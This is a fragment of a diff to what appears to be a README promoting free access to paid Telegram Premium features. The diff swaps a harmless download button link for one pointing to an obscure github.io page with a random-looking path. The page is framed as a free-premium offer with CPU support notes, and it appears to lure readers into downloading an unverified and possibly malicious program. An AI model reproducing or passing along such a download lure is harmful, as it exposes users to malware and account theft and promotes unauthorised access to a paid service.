@@ -15,7 +15,7 @@ If you’re considering a premium subscription and have the choice between payin
 
 With Telegram Premium boasting features like voice-to-text conversion, unlimited cloud storage, and animated emojis, you might be curious if there’s a way to access these premium features without spending a dime.
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://dulswi.github.io/id/sf9123vfd"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
